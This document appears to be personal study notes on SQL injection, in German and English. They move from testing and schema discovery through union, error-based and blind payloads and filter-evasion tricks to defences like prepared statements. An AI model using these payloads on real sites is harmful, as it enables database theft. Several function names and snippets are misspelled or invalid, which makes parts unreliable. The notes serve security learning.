# Abfragen
```sql
SELECT col1, ..., colN FROM [DB].table [WHERE condition] [ORDER BY col [DESC]] [LIMIT N,M]
```

##### Subquerys
```sql
SELECT * FROM inbox WHERE email = (SELECT email FROM contacts WHERE user = 'admin');
SELECT NOW();
SELECT * WHERE ID = 8/4;
```

# Injections
Find point of interest in PHP:
```php
mysql_request(), mysqli_request(), mssql_request(), pg_request(), ora_exec()
```
... `where id =' + $_[GET]`
```sql
... WHERE id = 0 OR True
```

# Phases:
# 1. Injection Testing
Test for:
- Quotes: `'`, `"`, or `` ` `` (On error: That is probably the quote used in the code)
- SQL-Befehle (Ungültige Syntax)
- Backslashes: `\` or `\\`
- Rechenoperationen: `id=3` vs. `id=4-1`
- Kommentar-Zeichen: `#`,`/*`,`-- Kommentar`, `;%00`
- Timing: `sleep` (can disturb the databases operation!)
- Boolean Logic: `id=1 and 1` vs. `id=1 or 0`
# 2. Information Gathering
### Get Version
`@@version` or `version()`
### Get User
`@@user` or `user()`
### Get Tablenames
`schema()` or `database()`
###### MySQL
```
SELECT * FROM information_schema.columns where table_schema=database()
```
##### SQLite
```
select * from sqlite_master where type = 'table'
```
##### Postgres
```
SELECT distinct table_name FROM information_schema.tables
```

### Get Column names
```sql
SELECT group_concat(table_column) FROM information_schema.tables WHERE table_name="users"
```
# SQLi Typen
### In-Band
##### Union based
`SELECT username FROM users WHERE id=`...
```sql
0 UNION SELECT password FROM users WHERE id=0 UNION SELECT 3
```
Anzahl ausgewählter Spalten muss in allen Anfragen gleich sein
-> Negate the first request with "AND 1=0"
-> Find out the number of columns in the first request by observing errors
	-> `UNION SELECT 1` -> `UNION SELECT 1,2` -> `UNION SELECT 1,2,3` -> ...
	-> `ORDER BY 1` -> `ORDER BY 2` -> `ORDER BY 3` -> ... 
When there is only one column in the first request, e.g., `SELECT 1`..., use group_concat() to concat all returning columns to one string
```sql
UNION group_concat(SELECT * FROM target_db)
```


##### Error based
`index.php?id=`...
XML-Funktionen:
```sql
1 AND extractvalue(1, CONCAT(0x2e, (SELECT @@version)))
```
```sql
1 AND updatexml(1, CONCAT(0x2e, (SELECT @@version)), 1)
```
-> XPATH syntax error contains sql version or what ever we request

Conditional error/response
```sql
1 UNION SELECT if(versioN() like "4%", 1, (SELECT 1 UNION SELECT 2)
```

Viele weitere Vektoren
### Blind
```sql
AND (SELECT SUSBTRING(table_name,1,1) FROM information_schema.tables) > 'A'
```
##### Boolean based
##### Time based 

### Out-of-band
Can it evaluate DNS querys? Then you could host your own DNS server and log communication. Can it write files? Interpret HTTP?

# Filter Evasion
Case sensitiv?
`UNION` vs `unION`

Blacklist?
`ununionion`

Encoding?
AA: 0x4141

Typecasting?
`0='c'`
`0=0`
`1 (True)`

Use `IF` instead of `WHERE`
Use `%09` instead of Tab
Use `%0a` or `%a0` instead of Newline

# Safe?
##### Prepared Statements are safe (when correctly implemented)
```php
$search = $_GET['search']
$mysqli->prepare("SELECT message FROM posts WHERE message LIKE ?")
bind_params("s", $search)
```
##### mysql_real_esacpe_string escapes, e.g.,  `%` and `"` but nothing else!
```php
$mysqli.mysql_real_esacpe_string($search).'%"'
```
##### is_numeric
Safe, but `is_numeric(0x414141) = true` !
##### addslashes
escapes special chars with slashes. Safe, if database and php use the same charset!
`addslashes(x%bf%27 UNION SELECT)= x%bf\' UNION SELECT`
-> PHP sees this as escaped, but the database might read `x%bf%27` as special asian character and then read it as `special_char' UNION SELECT` See https://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string